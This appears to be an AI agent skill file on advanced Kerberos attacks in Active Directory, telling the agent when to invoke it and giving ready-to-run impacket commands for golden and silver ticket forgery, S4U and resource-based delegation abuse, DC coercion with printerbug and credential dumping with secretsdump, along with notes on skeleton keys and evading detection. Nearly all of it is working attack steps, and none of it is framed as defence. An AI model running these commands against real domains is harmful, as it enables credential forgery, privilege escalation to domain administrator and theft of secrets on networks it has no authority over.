---
name: kerberos-advanced-attack
description: "Advanced Kerberos attacks: golden and silver tickets, S4U abuse, delegation chains, and ticket forgery. Use this skill once krbtgt or service hashes are available."
---

# Advanced Kerberos

## Overview

With key material, Kerberos becomes forgeable. With delegation misconfigurations, it becomes a privilege escalator.

## Golden ticket

Needs the `krbtgt` hash (from DCSync).

```bash
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC
```

A golden ticket survives password resets until `krbtgt` is rotated twice.

## Silver ticket

Needs a service account hash; forges a TGS for one service.

```bash
impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain domain.local \
  -spn cifs/fileserver.domain.local administrator
```

No DC contact — quieter, but limited to that service.

## S4U2Self / S4U2Proxy (constrained delegation)

If a computer is trusted for delegation to a service:

```bash
impacket-getST -spn cifs/target -impersonate administrator domain.local/svc:pass
```

With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), any user can be impersonated.

## RBCD (resource-based constrained delegation)

Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target, then S4U:

```bash
impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'P@ss123'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass
impacket-getST -spn cifs/target -impersonate administrator domain.local/'EVIL$':'P@ss123'
```

## Unconstrained delegation

A host with unconstrained delegation captures the TGT of any authenticating user. Coerce a DC:

```bash
# printerbug / petitpotam
python3 printerbug.py domain.local/user:pass@TARGET DC_FQDN
# then dump tickets from the target's memory
impacket-secretsdump -k -no-pass TARGET
```

## Skeleton key

Patch LSASS on a DC to accept a master password — requires DA and is highly detectable.

## Diamond / sapphire tickets

Forged PAC with a valid ticket signature from an account with `GenericAll` over a target — evades some detections.

## Pitfalls

- Golden tickets are detected by `krbtgt` hash rotation and by anomaly detection on ticket lifetime.
- Silver tickets lack a valid PAC signature in modern domains unless the service account hash is used correctly.
- Clock skew > 5 minutes breaks Kerberos — sync with the DC.

## Verification

The forged ticket must grant access to the intended service without a password.
